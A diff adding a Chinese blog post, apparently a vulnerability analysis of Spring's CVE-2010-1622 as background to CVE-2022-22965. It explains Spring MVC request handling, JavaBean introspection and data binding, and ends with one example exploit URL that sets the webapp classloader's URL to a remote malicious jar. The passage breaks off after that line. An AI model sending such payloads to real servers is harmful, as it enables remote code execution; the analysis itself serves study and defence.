@@ -1,0 +1,831 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CVE-2022-22965分析与利用 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CVE-2022-22965分析与利用 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="在了解spring4shell之前先了解spring Framework框架之前的漏洞以及了解spring Framework框架的内部运行机制及其特性的实现原理。
+CVE-2010-1622
+
+Versions Affected:
+3.0..." />
+    <meta name="keywords" content="java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              CVE-2022-22965分析与利用
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-05-20
+              </span>
+              <span>
+                35 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/gqY7ztfMX/" class="post-tag">
+                  # java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>在了解spring4shell之前先了解spring Framework框架之前的漏洞以及了解spring Framework框架的内部运行机制及其特性的实现原理。</p>
+<h1 id="cve-2010-1622">CVE-2010-1622</h1>
+<blockquote>
+<p>Versions Affected:<br>
+3.0.0 to 3.0.2<br>
+2.5.0 to 2.5.6.SEC01 (community releases)<br>
+2.5.0 to 2.5.7 (subscription customers)<br>
+Earlier versions may also be affected</p>
+</blockquote>
+<h2 id="环境搭建">环境搭建</h2>
+<p>springmvc 3.0.2<br>
+tomcat 6.0.20</p>
+<h2 id="spring代码分析">spring代码分析</h2>
+<p>spring中对http请求的入口方法是<code>org.springframework.web.servlet.DispatcherServlet#doDispatch()</code>方法，该方法用于获取适配器(handle)。在此方法之前并不是没有调用过spring的其他方法，其调用链如下：<br>
+可以看到，前面还调用了doGet、processRequest、doService方法，这些方法中大多数在做的都是对一些值进行初始化赋值的操作，并没涉及到处理请求(个人理解)。<br>
+我们从最开始的调用开始看起，可以看到，首先运行了一个线程，然后由tomcat容器将请求发送给spring，中间还调用了java servlet api依赖包。<br>
+<img src="https://1jzz.github.io/post-images/1653052310854.png" alt="" loading="lazy"></p>
+<h3 id="spring-mvc的执行流程">spring mvc的执行流程</h3>
+<ol>
+<li><code>interceptor.preHandle()</code>:链式调用(true)，在执行Controller的对应方法之前执行，对请求进行初始化或者预处理，如果返回false则整个请求结束</li>
+<li>调用了<code>DispatcherServlet#getHandler()</code>方法名获取request中的Handler，也就是Controller(通过findAnnotation来寻找)</li>
+<li>寻找Controller类中的<code>@RequestMapping</code>注解(遍历HandlerMethod寻找)，并且获得其值，于是就找到了uri所对应的controller中的方法(targetHanlderMethods)，这也就是为什么可以通过RequestMapping来设置uri路径<br>
+<img src="https://1jzz.github.io/post-images/1653052317757.png" alt="" loading="lazy"></li>
+<li>调用<code>AnnotationMethodHandlerAdapter.handle()</code>方法-&gt;<code>AnnotationMethodHandlerAdapter.invokeHandler()</code>方法-&gt;调用ServletHandlerMethodInvoker类的父类的<code>HandlerMethodInvoker.invokeHandlerMethod()</code>方法，先获取了其参数列表然后执行该Controller中的对应uri的方法<br>
+<img src="https://1jzz.github.io/post-images/1653052322814.png" alt="" loading="lazy"></li>
+<li>进入了Controller对应的方法之后返回一个ModelAndView对象(其中包含着ViewName(要进行转发的jsp)、Object(要转发的参数))<br>
+<img src="https://1jzz.github.io/post-images/1653052327611.png" alt="" loading="lazy"><br>
+根据Controller类中由RequestMapping注解的方法返回的类型初始化ModelAndView对象。<br>
+<img src="https://1jzz.github.io/post-images/1653052333708.png" alt="" loading="lazy"></li>
+<li><code>interceptor.postHandle()</code>：逆序调用，在Controller对应方法执行之后，视图进行渲染之前执行，所以可以用来处理在Controller返回的ModelAndView对象进行更改</li>
+<li>接下来进行视图解析，我在spring的xml配置文件中配置了一个视图解析器类InternalResourceViewResolver其interinternalResourceViewResolver方法设置jsp文件的前缀和后缀，方便写Controller。在<code>UrlBasedViewResolver#buildView()</code>方法中进行路径重组。创建的视图会缓存在InternalPathMethodNameResolver.viewCache字段<br>
+<img src="https://1jzz.github.io/post-images/1653052339428.png" alt="" loading="lazy"><br>
+<img src="https://1jzz.github.io/post-images/1653052346692.png" alt="" loading="lazy"></li>
+<li>在Controller带出来的model会赋值给mergedModel，传入到<code>AbstractView#exposeModelAsRequestAttributes()</code>方法，将model中的key和value通过<code>request#setAttribute()</code>方法设置attribute，和在servlet中转发给jsp本质上其实是一致的，但是经过了多层封装进行简化，从而简化开发者的步骤。在<code>InternalResourceView#renderMergedOutputModel(</code>)方法中还会调用<code>requestToExpose#getRequestDispatcher()</code>方法获取Dispatcher对象，最后调用<code>rd.forward(requestToExpose, response)</code>进行转发。此时，页面已经显示出了jsp中的内容<br>
+<img src="https://1jzz.github.io/post-images/1653052357108.png" alt="" loading="lazy"></li>
+<li><code>interceptor.afterCompletion()</code>:在视图渲染结束之后执行，主要用于资源清理工作<br>
+以上是我调试springmvc的执行流程所大致写的一个流程，接下来在网上找了执行流程图，看的比较清楚：<br>
+<img src="https://1jzz.github.io/post-images/1653052363979.png" alt="" loading="lazy"></li>
+</ol>
+<h2 id="java-bean">java Bean</h2>
+<p>在介绍spring Bean之前，先来了解一下java Bean是什么，官方的介绍如下：</p>
+<blockquote>
+<p>JavaBean 是一种 Java语言写成的可重用组件。写成JavaBean，类必须是具体的和公共的，并且具有无参数的构造器。JavaBean 通过提供符合一致性设计模式的公共方法将内部域暴露成员属性，long和class方法获取。众所周知，属性名称符合这种模式，其他Java 类可以通过自省机制发现和操作这些JavaBean 的属性。</p>
+</blockquote>
+<p>简单的来说，一个遵循java Bean标准的类则可以被称为java Bean。其要求如下：</p>
+<ul>
+<li>类声明为public</li>
+<li>类中所有的字段声明为private</li>
+<li>字段的值如果想要被获取则定义getter，如果想要被赋值则定义setter</li>
+</ul>
+<p>此外一个字段对应的setter、getter方法成为属性(property)。<br>
+java Bean的用途：主要用来传输数据，为了把数组集成在java Bean上方便传输。<br>
+我们可以通过 Java 核心库提供的Introspector来获取一个JavaBean的所有属性以及对应属性的读写方法：</p>
+<pre><code class="language-java">BeanInfo bi = Introspector.getBeanInfo(User.class);
+
+for (PropertyDescriptor pd : bi.getPropertyDescriptors()) {
+    System.out.println(&quot;Field Name: &quot; + pd.getName());
+    System.out.println(&quot;    Field setter: &quot; + pd.getReadMethod());
+    System.out.println(&quot;    Field getter: &quot; + pd.getWriteMethod());
+}
+for (MethodDescriptor pd : bi.getMethodDescriptors()) {
+    System.out.println(&quot;Method Name: &quot; + pd.getName());
+}
+</code></pre>
+<p>执行结果：<br>
+<img src="https://1jzz.github.io/post-images/1653052901159.png" alt="" loading="lazy"><br>
+可以看到除了User类中的age、id、name字段以外还有父类Object的class字段。</p>
+<h3 id="内省introspector">内省(Introspector)</h3>
+<p>内省是java对java Bean字段、事件的一种缺省处理方法。<br>
+JDK内省类库主要有以下几个：</p>
+<h4 id="introspector类">Introspector类</h4>
+<p>将java Bean中的属性进行封装。可以调用Intraospector.getBeanInfo()方法，将java类转换为BeanInfo对象，BeanInfo对象封装了这个类中属性的信息。</p>
+<h4 id="beaninfo类">BeanInfo类</h4>
+<p>BeanInfo是一个接口，具体实现是GenericBeanInfo，通过GenericBeanInfo类的实现方法可以获取如下信息：</p>
+<pre><code class="language-java">class GenericBeanInfo extends SimpleBeanInfo {
+    private BeanDescriptor beanDescriptor;
+    private PropertyDescriptor[] properties;
+    private MethodDescriptor[] methods;
+......
+}
+</code></pre>
+<ul>
+<li>BeanDescriptor：持有类的Class对象引用</li>
+<li>PropertyDescriptor[]：属性描述器</li>
+<li>MethodDescriptor[]：所有的方法描述器</li>
+</ul>
+<p>属性描述器和方法描述器都是为了方便反射调用。通过Intraospector可以获取一个类的BeanInfo，通过BeanInfo可以获取属性描述器、方法描述器、类Class对象，利用属性描述器我能可以将数据赋值给类实例。</p>
+<h4 id="propertydescriptor类">PropertyDescriptor类</h4>
+<p>其主要字段属性描述方法：</p>
+<ol>
+<li><code>getPropertyType()</code>：获得属性的Class对象</li>
+<li><code>getReadMethod()</code>：获得用于读取属性值的方法</li>
+<li><code>getWriteMethod()</code>：获得用于写入属性值的方法</li>
+<li><code>hashCode()</code>：获取对象的哈希值</li>
+<li><code>setReadMethod(Method readMethod)</code>：设置用于读取属性值的方法</li>
+<li><code>setWriteMethod(Method writeMethod)</code>：设置用于写入属性值的方法</li>
+</ol>
+<p>例子：</p>
+<pre><code class="language-java">Test test = new Test();
+System.out.println(test);
+PropertyDescriptor propertyDescriptor = new PropertyDescriptor(&quot;age&quot;, Test.class);
+Method readMethod = propertyDescriptor.getReadMethod();
+System.out.println(readMethod.invoke(test));
+
+Method writeMethod = propertyDescriptor.getWriteMethod();
+writeMethod.invoke(test, 20);
+System.out.println(test);
+</code></pre>
+<p>执行结果：<br>
+<img src="https://1jzz.github.io/post-images/1653052931336.png" alt="" loading="lazy"></p>
+<h4 id="propertyeditor类">PropertyEditor类</h4>
+<p>该类用于对属性的扩展，用于类型的转换。例如通过setAsText()方法将String转为Date对象赋值给lastLoginTime字段。<br>
+例子：</p>
+<pre><code class="language-java">//UserPropertyEditSupport实现PropertyEditor接口
+private Date lastLoginTime;
+
+@Override
+public void setValue(Object value) {
+    this.lastLoginTime = (Date) value;
+}
+
+@Override
+public Object getValue() {
+    return this.lastLoginTime;
+}
+
+//UserPropertyEdit继承UserPropertyEditSupport类
+@Override
+public String getAsText() {
+    Date value = (Date) getValue();
+    DateFormat dateFormat = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);
+    return dateFormat.format(value);
+}
+
+@Override
+public void setAsText(String text) throws IllegalArgumentException {
+    DateFormat dateFormat = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);
+    try {
+        Date date = dateFormat.parse(text);
+        setValue(date);
+    } catch (ParseException e) {
+        e.printStackTrace();
+    }
+
+}
+
+//main
+UserPropertyEdit userPropertyEdit = new UserPropertyEdit();
+userPropertyEdit.setAsText(&quot;2022-04-25 21:08:32&quot;);
+Date value = (Date) userPropertyEdit.getValue();
+System.out.println(value);
+</code></pre>
+<h3 id="spring-bean">Spring Bean</h3>
+<blockquote>
+<p>Spring Bean是事物处理组件类和实体类（POJO）对象的总称，是能够被实例化、能够被spring容器管理的java对象。</p>
+</blockquote>
+<p>Spring中专门提供了用于缓存JavaBean的PropertyDescriptor描述信息的类——CachedIntrospectionResults。<br>
+CachedIntrospectionResults类并不可以直接调用，因为其构造方法是私有的，无法实例化对象调用其static方法forClass。但是可以通过<code>org.springframework.beans.BeanUtils#getPropertyDescriptors()</code>静态方法来调用<code>CachedIntrospectionResults.forClass(clazz)</code>。<br>
+例子：</p>
+<pre><code class="language-java">PropertyDescriptor[] propertyDescriptors =  BeanUtils.getPropertyDescriptors(User.class);
+for (PropertyDescriptor pd : propertyDescriptors) {
+    System.out.println(&quot;Field Name: &quot; + pd.getName());
+    System.out.println(&quot;    Field setter: &quot; + pd.getReadMethod());
+    System.out.println(&quot;    Field getter: &quot; + pd.getWriteMethod());
+}
+</code></pre>
+<p>执行结果：<br>
+<img src="https://1jzz.github.io/post-images/1653052957322.png" alt="" loading="lazy"><br>
+其中<code>CachedIntrospectionResults#forClass()</code>方法中会把beanClass(javaBean的Class类)以及CachedIntrospectionResults对象调用Collections类中的内部静态类的<code>SynchronizedMap#put()</code>方法put到SynchronizedMap类的m字段中进行缓存（单例模式static final）。<br>
+BeanWrapper接口类的实现方法BeanWrapperImpl：<br>
+该类中有一个cachedIntrospectionResults字段，为CachedIntrospectionResults类对象，是为了缓存对象的内省结果，节省每次遇到javaBean内省的成本。该类(BeanWrapperImpl)实际上是对CachedIntrospectionResults类的一个封装，实际上还是依赖CachedIntrospectionResults类的。<br>
+例子：</p>
+<pre><code class="language-java">User user = new User();
+BeanWrapper bw = new BeanWrapperImpl(user);
+PropertyDescriptor pd = bw.getPropertyDescriptor(&quot;name&quot;);
+System.out.println(pd.getReadMethod());
+System.out.println(pd.getWriteMethod());
+</code></pre>
+<h4 id="调用构造器创建bean对象实际开发常用">调用构造器创建Bean对象(实际开发常用)</h4>
+<ol>
+<li>利用无参构造函数 + setter方法构造Bean对象实例</li>
+</ol>
+<pre><code class="language-java">&lt;bean id=&quot;user&quot; class=&quot;top.ljzz.dao.User&quot;&gt;
+      &lt;property name=&quot;name&quot; value=&quot;1jzz&quot;/&gt;
+      &lt;property name=&quot;id&quot; value=&quot;1&quot; /&gt;
+&lt;/bean&gt;
+</code></pre>
+<ol start="2">
+<li>利用有参构造函数直接注入值构造Bean对象实例，指定构造函数中的属性名以及其值</li>
+</ol>
+<pre><code class="language-java">&lt;bean id=&quot;user&quot; class=&quot;top.ljzz.dao.User&quot;&gt;
+          &lt;constructor-arg name=&quot;id&quot; value=&quot;1&quot;&gt;&lt;/constructor-arg&gt;
+          &lt;constructor-arg name=&quot;name&quot; value=&quot;1jzz&quot;&gt;&lt;/constructor-arg&gt;
+          &lt;constructor-arg name=&quot;age&quot; value=&quot;20&quot;&gt;&lt;/constructor-arg&gt;
+&lt;/bean&gt;
+</code></pre>
+<ol start="3">
+<li>调用静态工厂方法创建Bean对象</li>
+</ol>
+<pre><code class="language-java">public class UserFactory {
+    public static User createUser(){
+        return new User();
+    }
+
+    public static User createUser(int id, String name, int age) {
+        return new User(id, name, age);
+    }
+}
+</code></pre>
+<p>xml文件中定义bean对象(通过调用静态工厂类的createUser方法创建Bean对象)</p>
+<pre><code class="language-java">&lt;bean id=&quot;user&quot; class=&quot;top.ljzz.dao.UserFactory&quot; factory-method=&quot;createUser&quot;&gt;
+      &lt;constructor-arg name=&quot;id&quot; value=&quot;1&quot;&gt;&lt;/constructor-arg&gt;
+      &lt;constructor-arg name=&quot;name&quot; value=&quot;1jzz&quot;&gt;&lt;/constructor-arg&gt;
+      &lt;constructor-arg name=&quot;age&quot; value=&quot;20&quot;&gt;&lt;/constructor-arg&gt;
+&lt;/bean&gt;
+</code></pre>
+<ol start="4">
+<li>调用实例工厂方法创建Bean对象</li>
+</ol>
+<p>因为是调用工厂实例的方法，所以创建Bean的方法不能为static。</p>
+<pre><code class="language-xml"> &lt;!-- 配置工厂Bean，class指定该工厂的实现类，该Bean负责产生Bean实例 --&gt;
+ &lt;bean id=&quot;userFactory&quot; class=&quot;top.ljzz.dao.UserFactory&quot;/&gt;
+
+ &lt;!-- 再引用工厂Bean来配置其他Bean --&gt;
+ &lt;bean id=&quot;user&quot; factory-bean=&quot;userFactory&quot; factory-method=&quot;createUser&quot;&gt;
+        &lt;constructor-arg name=&quot;id&quot; value=&quot;1&quot;&gt;&lt;/constructor-arg&gt;
+        &lt;constructor-arg name=&quot;name&quot; value=&quot;1jzz&quot;&gt;&lt;/constructor-arg&gt;
+        &lt;constructor-arg name=&quot;age&quot; value=&quot;20&quot;&gt;&lt;/constructor-arg&gt;
+ &lt;/bean&gt;
+</code></pre>
+<h4 id="spring-bean加载流程">Spring bean加载流程</h4>
+<ol>
+<li><code>ContextLoaderListener.contextInitialized()</code>：传入ApplicationContextFacade类实例</li>
+<li>调用了ContextLoaderListener父类<code>ContextLoader#initWebApplicationContext()</code>方法：</li>
+<li><code>ContextLoader.createWebApplicationContext()</code>：使用WebappClassLoader类加载器加载<code>org.springframework.web.context.support.XmlWebApplicationContext</code>类的Class类，然后通过反射来获取该类的实例化对象。最后将ApplicationContextFacade类对象封装到<code>XmlWebApplicationContext</code>类对象中。其中wac中的ConfigLocation字段存储着配置xml文件(applicationContext.xml)，这里的wac.refresh()方法是创建beanFactory也就是DefaultListableBeanFactory类对象，并对其进行初始化(各种Dependency)。<br>
+<img src="https://1jzz.github.io/post-images/1653053008808.png" alt="" loading="lazy"></li>
+<li><code>AbstractApplicationContext.invokeBeanFactoryPostProcessors()</code>：注册Bean的处理器，基于BeanDefinitionRegistryPostProcessor接口</li>
+<li><code>DefaultListableBeanFactory.getBeansOfType()</code>：调用getBeanNamesForType方法获取beanNames，返回的类名将会被注册Spring Bean</li>
+<li><code>AbstractBeanFactory.doGetBean()</code>：先是检查了单例模式的缓存，如果在缓存中找不到的话就创建该bean的实例，并add到<code>this.alreadyCreated</code>属性中。调用getSingleton方法，传入一个new ObjectFactory()对象，传入的对象为一个AbstractBeanFactory对象(不咋明白)，</li>
+</ol>
+<pre><code class="language-java">sharedInstance = getSingleton(beanName, new ObjectFactory() {
+    public Object getObject() throws BeansException {
+        try {
+            return createBean(beanName, mbd, args);
+        }
+        catch (BeansException ex) {
+            // Explicitly remove instance from singleton cache: It might have been put there
+            // eagerly by the creation process, to allow for circular reference resolution.
+            // Also remove any beans that received a temporary reference to the bean.
+            destroySingleton(beanName);
+            throw ex;
+        }
+    }
+});
+</code></pre>
+<p><img src="https://1jzz.github.io/post-images/1653053044904.png" alt="" loading="lazy"><br>
+7. <code>DefaultSingletonBeanRegistry.getSingleton()</code>：调用了传入进来的getObject方法<br>
+8. <code>AbstractAutowireCapableBeanFactory.createBean()</code>：调用doCreateBean方法<br>
+9. <code>AbstractAutowireCapableBeanFactory.doCreateBean()</code>：调用createBeanInstance方法<br>
+10. <code>AbstractAutowireCapableBeanFactory.createBeanInstance()</code>：如果Bean Class不是public则抛出异常<br>
+11. <code>SimpleInstantiationStrategy.instantiate()</code>：以下代码中将获取bean 的无参构造函数赋值给resolvedConstructorOrFactoryMethod字段</p>
+<pre><code class="language-java">try {
+    if (System.getSecurityManager() != null) {
+        constructorToUse = AccessController.doPrivileged(new PrivilegedExceptionAction&lt;Constructor&gt;() {
+            public Constructor run() throws Exception {
+                return clazz.getDeclaredConstructor((Class[]) null);
+            }
+        });
+    } else {
+        constructorToUse =	clazz.getDeclaredConstructor((Class[]) null);
+    }
+    beanDefinition.resolvedConstructorOrFactoryMethod = constructorToUse;
+}
+</code></pre>
+<ol start="12">
+<li>实例化该类的BeanWrapperImpl对象，调用<code>AbstractAutowireCapableBeanFactory.initBeanWrapper(bw)</code>方法，进行setConversionService和注册CustomEditors</li>
+<li><code>AbstractAutowireCapableBeanFactory.populateBean()</code></li>
+<li>将该bean添加到<code>this.registeredSingletons</code>以及<code>this.singletonObjects</code></li>
+</ol>
+<p>流程分析就只是单纯的写一写调用关系,也并没分析的特别清楚。借用网上的<a href="https://juejin.cn/post/6969034239199150087">流程图</a>来看的更加清楚些。<br>
+<img src="https://1jzz.github.io/post-images/1653052457389.webp" alt="" loading="lazy"></p>
+<h2 id="spring参数绑定对象以及赋值流程">spring参数绑定对象以及赋值流程</h2>
+<p>调用链：<br>
+<img src="https://1jzz.github.io/post-images/1653052471979.png" alt="" loading="lazy"></p>
+<ol>
+<li><code>DispatcherServlet.getHandlerAdapter()</code>：获取默认的HandlerAdapter，为一个AnnotationMethodHandlerAdapter类对象</li>
+<li><code>AnnotationMethodHandlerAdapter.handle()</code>：调用invokeHandlerMethod方法</li>
+<li><code>AnnotationMethodHandlerAdapter.invokeHandlerMethod()</code>：执行Hanler对应的Method</li>
+<li><code>AnnotationMethodHandlerAdapter.resolveHandlerMethod()</code>：匹配uri路径与Controller中的RequestMapping，从而找到HandlerMethod</li>
+<li><code>HandlerMethodInvoker.invokeHandlerMethod()</code>：调用resolveHandlerArguments方法</li>
+<li><code>HandlerMethodInvoker.resolveHandlerArguments()</code>：得到了Controler对应的的方法中的传入参数类型，这里为User类对象。调用了doBind方法</li>
+<li><code>HandlerMethodInvoker.doBind()</code>：调用了AnnotationMethodHandlerAdapter类的内部类的<code>ServletHandlerMethodInvoker.doBind()</code>方法</li>
+<li><code>AnnotationMethodHandlerAdapter$ServletHandlerMethodInvoker.doBind()</code>：调用了<code>ServletRequestDataBinder#bind()</code>方法，最终调用到ServletRequestDataBinder父类的父类的<code>DataBinder#applyPropertyValues()</code>方法对属性进行赋值</li>
+<li><code>BeanWrapperImpl.setPropertyValues()</code>：看到这个类以及这个方法名，我们大概可以知道会对这个属性进行赋值。这里我们可以看到，获取了User类的PropertyDescriptor对象。并且通过调用其ReadMethod方法，获取了oldValue。然后通过调用其WriteMethod方法，设置了User类的name属性的值。</li>
+</ol>
+<p><img src="https://1jzz.github.io/post-images/1653052481891.png" alt="" loading="lazy"><br>
+这样，传入的参数就成功的赋值给了soring bean的对象。</p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>既然我们可以通过<code>?class=xxx</code>的方式获取到了Class类对象，那么我们就可以调用其setter方法对属性进行赋值。我们可以查看一下Class类中的属性：</p>
+<pre><code class="language-java">Field Name: annotatedInterfaces
+    Field setter: public java.lang.reflect.AnnotatedType[] java.lang.Class.getAnnotatedInterfaces()
+    Field getter: null
+Field Name: annotatedSuperclass
+    Field setter: public java.lang.reflect.AnnotatedType java.lang.Class.getAnnotatedSuperclass()
+    Field getter: null
+Field Name: annotation
+    Field setter: public boolean java.lang.Class.isAnnotation()
+    Field getter: null
+Field Name: annotations
+    Field setter: public java.lang.annotation.Annotation[] java.lang.Class.getAnnotations()
+    Field getter: null
+Field Name: anonymousClass
+    Field setter: public boolean java.lang.Class.isAnonymousClass()
+    Field getter: null
+Field Name: array
+    Field setter: public native boolean java.lang.Class.isArray()
+    Field getter: null
+Field Name: canonicalName
+    Field setter: public java.lang.String java.lang.Class.getCanonicalName()
+    Field getter: null
+Field Name: class
+    Field setter: public final native java.lang.Class java.lang.Object.getClass()
+    Field getter: null
+Field Name: classLoader
+    Field setter: public java.lang.ClassLoader java.lang.Class.getClassLoader()
+    Field getter: null
+Field Name: classes
+    Field setter: public java.lang.Class[] java.lang.Class.getClasses()
+    Field getter: null
+Field Name: componentType
+    Field setter: public native java.lang.Class java.lang.Class.getComponentType()
+    Field getter: null
+Field Name: constructors
+    Field setter: public java.lang.reflect.Constructor[] java.lang.Class.getConstructors() throws java.lang.SecurityException
+    Field getter: null
+Field Name: declaredAnnotations
+    Field setter: public java.lang.annotation.Annotation[] java.lang.Class.getDeclaredAnnotations()
+    Field getter: null
+Field Name: declaredClasses
+    Field setter: public java.lang.Class[] java.lang.Class.getDeclaredClasses() throws java.lang.SecurityException
+    Field getter: null
+Field Name: declaredConstructors
+    Field setter: public java.lang.reflect.Constructor[] java.lang.Class.getDeclaredConstructors() throws java.lang.SecurityException
+    Field getter: null
+Field Name: declaredFields
+    Field setter: public java.lang.reflect.Field[] java.lang.Class.getDeclaredFields() throws java.lang.SecurityException
+    Field getter: null
+Field Name: declaredMethods
+    Field setter: public java.lang.reflect.Method[] java.lang.Class.getDeclaredMethods() throws java.lang.SecurityException
+    Field getter: null
+Field Name: declaringClass
+    Field setter: public java.lang.Class java.lang.Class.getDeclaringClass() throws java.lang.SecurityException
+    Field getter: null
+Field Name: enclosingClass
+    Field setter: public java.lang.Class java.lang.Class.getEnclosingClass() throws java.lang.SecurityException
+    Field getter: null
+Field Name: enclosingConstructor
+    Field setter: public java.lang.reflect.Constructor java.lang.Class.getEnclosingConstructor() throws java.lang.SecurityException
+    Field getter: null
+Field Name: enclosingMethod
+    Field setter: public java.lang.reflect.Method java.lang.Class.getEnclosingMethod() throws java.lang.SecurityException
+    Field getter: null
+Field Name: enum
+    Field setter: public boolean java.lang.Class.isEnum()
+    Field getter: null
+Field Name: enumConstants
+    Field setter: public java.lang.Object[] java.lang.Class.getEnumConstants()
+    Field getter: null
+Field Name: fields
+    Field setter: public java.lang.reflect.Field[] java.lang.Class.getFields() throws java.lang.SecurityException
+    Field getter: null
+Field Name: genericInterfaces
+    Field setter: public java.lang.reflect.Type[] java.lang.Class.getGenericInterfaces()
+    Field getter: null
+Field Name: genericSuperclass
+    Field setter: public java.lang.reflect.Type java.lang.Class.getGenericSuperclass()
+    Field getter: null
+Field Name: interface
+    Field setter: public native boolean java.lang.Class.isInterface()
+    Field getter: null
+Field Name: interfaces
+    Field setter: public java.lang.Class[] java.lang.Class.getInterfaces()
+    Field getter: null
+Field Name: localClass
+    Field setter: public boolean java.lang.Class.isLocalClass()
+    Field getter: null
+Field Name: memberClass
+    Field setter: public boolean java.lang.Class.isMemberClass()
+    Field getter: null
+Field Name: methods
+    Field setter: public java.lang.reflect.Method[] java.lang.Class.getMethods() throws java.lang.SecurityException
+    Field getter: null
+Field Name: modifiers
+    Field setter: public native int java.lang.Class.getModifiers()
+    Field getter: null
+Field Name: name
+    Field setter: public java.lang.String java.lang.Class.getName()
+    Field getter: null
+Field Name: package
+    Field setter: public java.lang.Package java.lang.Class.getPackage()
+    Field getter: null
+Field Name: primitive
+    Field setter: public native boolean java.lang.Class.isPrimitive()
+    Field getter: null
+Field Name: protectionDomain
+    Field setter: public java.security.ProtectionDomain java.lang.Class.getProtectionDomain()
+    Field getter: null
+Field Name: signers
+    Field setter: public native java.lang.Object[] java.lang.Class.getSigners()
+    Field getter: null
+Field Name: simpleName
+    Field setter: public java.lang.String java.lang.Class.getSimpleName()
+    Field getter: null
+Field Name: superclass
+    Field setter: public native java.lang.Class java.lang.Class.getSuperclass()
+    Field getter: null
+Field Name: synthetic
+    Field setter: public boolean java.lang.Class.isSynthetic()
+    Field getter: null
+Field Name: typeName
+    Field setter: public java.lang.String java.lang.Class.getTypeName()
+    Field getter: null
+Field Name: typeParameters
+    Field setter: public java.lang.reflect.TypeVariable[] java.lang.Class.getTypeParameters()
+    Field getter: null
+</code></pre>
+<p>但是这些属性都没有getter方法，我们可以先试一试将User类中的setName方法给去掉，那么通过get传入的name变量是否还能成功赋值呢？<br>
+<img src="https://1jzz.github.io/post-images/1653052492948.png" alt="" loading="lazy"><br>
+这里漏洞的触发点在<code>class.classLoader.URLs[0]=xxxx</code>也就是执行了如下代码：<br>
+<code>getClass().getClassLoader.setURLs(0, xxxx)</code><br>
+为什么payload会是这样的呢？首先我们获取了加载User类的ClassLoader，如下图所示，可以看到是一个WebappClassLoader类。先是调用了getURLs方法获取其值。<br>
+<img src="https://1jzz.github.io/post-images/1653053140740.png" alt="" loading="lazy"><br>
+当我们看了WebappClassLoader的代码之后发现，该类中并没有setUrls方法，那是如何对其进行赋值的呢？</p>
+<pre><code class="language-java">if (tokens.keys != null) {
+    // Apply indexes and map keys: fetch value for all keys but the last one.
+    PropertyTokenHolder getterTokens = new PropertyTokenHolder();
+    getterTokens.canonicalName = tokens.canonicalName;
+    getterTokens.actualName = tokens.actualName;
+    getterTokens.keys = new String[tokens.keys.length - 1];
+    System.arraycopy(tokens.keys, 0, getterTokens.keys, 0, tokens.keys.length - 1);
+    Object propValue;
+    try {
+        propValue = getPropertyValue(getterTokens);
+    }
+    catch (NotReadablePropertyException ex) {
+        throw new NotWritablePropertyException(getRootClass(), this.nestedPath + propertyName,
+                                               &quot;Cannot access indexed value in property referenced &quot; +
+                                               &quot;in indexed property path '&quot; + propertyName + &quot;'&quot;, ex);
+    }
+    // Set value for last key.
+    String key = tokens.keys[tokens.keys.length - 1];
+    if (propValue == null) {
+        throw new NullValueInNestedPathException(getRootClass(), this.nestedPath + propertyName,
+                                                 &quot;Cannot access indexed value in property referenced &quot; +
+                                                 &quot;in indexed property path '&quot; + propertyName + &quot;': returned null&quot;);
+    }
+    else if (propValue.getClass().isArray()) {
+        Class requiredType = propValue.getClass().getComponentType();
+        int arrayIndex = Integer.parseInt(key);
+        Object oldValue = null;
+        try {
+            if (isExtractOldValueForEditor()) {
+                oldValue = Array.get(propValue, arrayIndex);
+            }
+            Object convertedValue = this.typeConverterDelegate.convertIfNecessary(
+                propertyName, oldValue, pv.getValue(), requiredType);
+            Array.set(propValue, Integer.parseInt(key), convertedValue);
+        }
+</code></pre>
+<ol>
+<li>只有在存在key的时候才会触发(数组中的索引)</li>
+<li>获取到的值propValue是一个数组</li>
+<li>requiredType为需要转换的类，这里就是URL对象，只有在可以转换的前提下才能进行赋值，否则抛出异常</li>
+<li>最后通过Array.set()方法对其进行赋值，所以尽管没有setter方法也能修改数组指定索引的值</li>
+</ol>
+<p>既然数组可以没有setter方法就可以被赋值，接下来就需要进行查找利用方式了。ClassLoader我们并不陌生，它可以加载类，如果我们可以覆盖加载类的地址，加载一个恶意类的话，那么也就可以实现利用了。<br>
+例如：<a href="http://127.0.0.1:8080/home/test?class.classLoader.URLs%5B0%5D=jar:http://127.0.0.1/exp.jar!/">http://127.0.0.1:8080/home/test?class.classLoader.URLs[0]=jar:http://127.0.0.1/exp.jar!</a></p>
+<blockquote>
